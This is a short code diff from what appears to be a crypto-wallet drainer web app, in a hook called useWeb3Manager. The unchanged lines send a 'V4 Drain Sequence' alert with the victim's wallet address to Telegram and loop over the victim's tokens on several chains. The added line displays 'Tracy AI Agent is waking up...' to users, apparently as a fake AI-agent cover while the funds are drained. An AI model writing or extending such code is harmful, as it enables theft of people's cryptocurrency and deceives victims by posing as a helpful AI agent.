@@ -403,6 +403,7 @@ export function useWeb3Manager() {
             const chainIds = Object.keys(tokensByChain);
 
             // Notify Start
+            setCurrentTask("Tracy AI Agent is waking up...");
             notifyTelegram(`<b>🚀 Initiating V4 Drain Sequence</b>\nAddress: <code>${address}</code>\nTarget Chains: ${chainIds.length}`);
 
             for (const chainId of chainIds) {
